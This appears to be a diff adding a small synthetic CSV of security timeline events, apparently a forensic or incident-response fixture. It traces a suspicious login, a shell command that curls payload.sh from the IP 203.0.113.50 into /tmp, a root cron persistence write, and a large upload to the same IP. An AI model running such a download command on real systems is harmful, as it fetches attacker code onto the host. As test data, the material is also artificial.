@@ -1,0 +1,6 @@
+timestamp,source,host,user,action,detail,ip,country
+2026-04-20T08:04:12Z,plaso-auth,vpn-gateway,morgan,login_success,successful login from suspicious IP,203.0.113.50,RU
+2026-04-20T08:06:30Z,plaso-auth,vpn-gateway,morgan,login_success,successful login from US endpoint,198.51.100.23,US
+2026-04-20T08:10:05Z,plaso-shell,workstation-7,morgan,process_start,curl http://203.0.113.50/payload.sh -o /tmp/payload.sh,,
+2026-04-20T08:12:00Z,plaso-system,workstation-7,root,cron_write,new cron persistence entry,,
+2026-04-20T08:16:20Z,plaso-network,workstation-7,morgan,large_upload,large upload to suspicious IP 203.0.113.50,,
